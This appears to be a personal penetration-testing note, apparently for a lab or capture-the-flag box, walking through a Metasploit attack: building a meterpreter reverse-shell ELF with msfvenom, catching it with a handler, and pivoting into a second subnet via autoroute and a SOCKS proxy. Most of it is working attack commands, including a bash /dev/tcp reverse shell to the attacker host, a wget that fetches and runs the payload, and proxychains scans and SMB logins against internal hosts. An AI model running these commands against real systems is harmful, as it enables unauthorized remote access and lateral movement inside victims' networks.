# temp — Metasploit shell + pivot

Get a meterpreter session on the Linux box, then pivot through it into a second network. Use **meterpreter** (not a raw shell) — autoroute/SOCKS only work through meterpreter, and staged meterpreter also avoids the stageless-ELF segfault.

Values here: **LHOST = 10.10.14.7** (your local box — where the shell calls back), **LPORT = 4444**, **target = 10.129.1.61** (where you run the ELF). LHOST is always your machine, never the target.

## 1. Build it (meterpreter, staged)

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp -a x64 --platform linux LHOST=10.10.14.7 LPORT=4444 -f elf -o shell.elf
ls -l shell.elf                # confirm it was created
```

> `No platform was selected` / `No Arch selected` are **info messages, not errors** — the file still builds. The `-a x64 --platform linux` above makes them go away. The only thing that matters is the `Saved as: shell.elf` line and that `ls -l shell.elf` shows the file.

## 2. Start the handler

```bash
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.7; set LPORT 4444; run"
```

## 3. Run it on the target (10.129.1.61)

Get `shell.elf` onto the target, then:

```bash
chmod +x shell.elf && ./shell.elf      # -> you get: meterpreter >
```

## 3b. If the ELF segfaults (`Segmentation fault (core dumped)`)

Two causes: the file got corrupted in transfer, or the ELF is incompatible with the host.

**First, verify the file on the target:**

```bash
file shell.elf      # must say: ELF 64-bit LSB ... x86-64
wc -c shell.elf     # byte count must MATCH the copy on your attacker box
```

If it's mangled or the size differs, re-transfer in binary (never copy-paste a binary):

```bash
# attacker:
python3 -m http.server 80
# target:
wget http://10.10.14.7/shell.elf && chmod +x shell.elf && ./shell.elf
```

**If the file is intact and still crashes, skip the ELF** — get a native bash shell and let msf upgrade it to meterpreter (what the pivot needs anyway):

```text
# in msf — catch a raw shell:
use exploit/multi/handler
set payload generic/shell_reverse_tcp
set LHOST 10.10.14.7
set LPORT 4444
run
```

```bash
# on the target — native, no ELF:
bash -i >& /dev/tcp/10.10.14.7/4444 0>&1
```

```text
# back in msf, once the shell lands:
# press Ctrl+Z to background the shell session, then:
sessions -u 1       # upgrade session 1 -> meterpreter (for autoroute/socks below)
```

## 4. Pivot into the second network

Example: the box also touches `10.10.20.0/24`.

```bash
# in the meterpreter session:
run autoroute -s 10.10.20.0/24         # route that subnet through this session
bg                                      # background to the msf console

# open a SOCKS proxy so tools outside msf can reach it:
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run
```

## 5. Use it from outside msf

Add to `/etc/proxychains4.conf`:

```text
socks5 127.0.0.1 1080
```

Then:

```bash
proxychains nmap -sT -Pn -n 10.10.20.5
proxychains nxc smb 10.10.20.0/24 -u user -p pass
```

---

Full / multi-hop version: [Pivoting & Tunneling](Obsidian%20Vault/Offense/Networking/Pivoting%20%26%20Tunneling.md#metasploit-pivoting)
